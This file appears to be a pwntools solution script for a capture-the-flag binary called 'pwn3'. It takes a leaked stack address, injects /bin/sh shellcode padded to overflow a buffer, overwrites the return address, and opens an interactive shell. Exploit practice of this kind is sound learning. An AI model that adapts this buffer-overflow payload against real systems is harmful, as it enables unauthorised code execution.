'''
Author: Samrito
Date: 2021-12-21 22:23:26
LastEditors: Samrito
LastEditTime: 2021-12-21 22:39:52
'''

from pwn import *

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

io = process(argv=['./pwn3'])
context.log_level = 'debug'
context.os = 'linux'
context.arch = 'i386'

io.recvuntil('on your journey ')
addr = int(io.recvline()[:-2], 16)
log.info(hex(addr))

debug('b * echo')
shellcode = asm(shellcraft.sh())
payload = flat([shellcode.ljust(0x12a+4, b'\x00'), addr])
io.sendline(payload)

io.interactive()